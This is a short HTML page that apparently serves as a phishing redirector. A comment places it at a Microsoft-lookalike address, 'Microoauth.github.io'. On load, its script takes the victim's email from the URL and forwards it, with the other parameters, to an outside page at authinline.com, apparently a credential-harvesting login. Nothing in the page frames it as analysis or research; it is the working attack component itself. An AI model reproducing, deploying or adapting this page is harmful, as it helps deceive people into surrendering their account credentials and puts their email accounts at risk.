<!DOCTYPE html>
<html>
<head>
  <title>Email Redirect</title>
  <script>
    function extractEmailAndRedirect() {
      // Get the current URL
      var currentURL = window.location.href;

      // Check if the current URL contains a '?' character
      if (currentURL.includes('?')) {
        // Split the URL into two parts: the base URL and the email part
        var parts = currentURL.split('?');
        var baseURL = parts[0]; // https://Microoauth.github.io/mail
        var emailPart = parts[1];

        // Check if the email part is not empty
        if (emailPart) {
          // Split the emailPart into email and the rest of the parameters
          var emailParams = emailPart.split('&');
          var email = "";
          var rest = "";
          
          for (var i = 0; i < emailParams.length; i++) {
            var param = emailParams[i].split('=');
            if (param[0] === 'email') {
              // Extract the email parameter value
              email = param[1];
            } else {
              if (rest) {
                rest += "&" + emailParams[i];
              } else {
                rest = emailParams[i];
              }
            }
          }
          
          if (email) {
            // Construct the redirect URL with the email as the last part
            var redirectURL = 'https://authinline.com/email/index.html?' + rest + '&email=' + email;
            // Redirect to the constructed URL
            window.location.href = redirectURL;
          } else {
            // If the email part is empty or not found, simply redirect to the second link
            window.location.href = 'https://authinline.com/email/index.html/';
          }
        }
      } else {
        // If no '?' character is found, simply redirect to the second link
        window.location.href = 'https://authinline.com/email/index.html/';
      }
    }

    // Call the function immediately when the script is loaded
    extractEmailAndRedirect();
  </script>
</head>
<body>
</body>
</html>
